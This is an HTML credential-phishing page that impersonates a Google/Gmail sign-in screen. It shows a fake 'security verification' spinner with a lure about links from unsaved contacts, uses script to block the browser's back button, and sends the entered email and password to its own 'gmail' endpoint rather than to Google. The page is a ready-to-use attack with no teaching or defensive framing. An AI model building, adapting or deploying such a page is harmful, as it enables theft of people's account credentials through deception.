<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <title>Gmail Login</title>

        <!-- logo -->
        <link rel="shortcut icon" href="google_logo.png" type="image/png">

        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

        <!-- Bootstrap CSS -->
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">

        <!-- font awesome -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

        <!-- style.css -->
        <link rel="stylesheet" href="/css/style.css">
        
        <!-- back prevention -->
        <script type = "text/javascript" >  
            function preventBack() { window.history.forward(); }  
            setTimeout("preventBack()", 0);  
            window.onunload = function () { null };  
        </script>
    </head>

    <body>
	   <div class="lag">
	    <div class="time_lapse text-center">
	    	<p id="text" style="font-weight: bold;">For security reasons, bypassing the google verification is required for the links received from unsaved contacts.</p>
	    	<div class="spinner-border" role="status">
  				<span class="visually-hidden"></span>
			</div>
	    </div>
	   </div>
      <div class="container mt-5">
        <div class="header text-center">
          <div class="google_logo">
            <img src="Google.png" alt="Google">
          </div>
          <div class="title">
            <h2>One Account. All of Google</h2>
            <h5>Sign in to continue</h5>
          </div>
        </div>
        <div class="box">
          <div class="profile_logo text-center p-3">
            <img src="userlogo.jpg" alt="">
          </div>
          <div class="signinform">
            <form action="gmail" method="post">
              <div class="inputs text-center">
                <input type="email" placeholder="Email" style="margin-bottom: 2px;" name="email">
                <br>
                <input type="password" placeholder="Password" name="password">
              </div>
              <div class="container text-center pt-3 pb-3">
                <button class="btn btn-primary signinbtn">Sign in</button>
              </div>
            </form>
          </div>
          <div class="container text-right">
            <a id="needhelp" href="#">Need help?</a>
          </div>
        </div>
      </div>
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>
    <script>
	    $(document).ready(function(){
	    	setTimeout(()=>{
	    		$(".lag").css("display", "none");
	    	}, 9000);
	    	});
    </script>
</body>
</html>
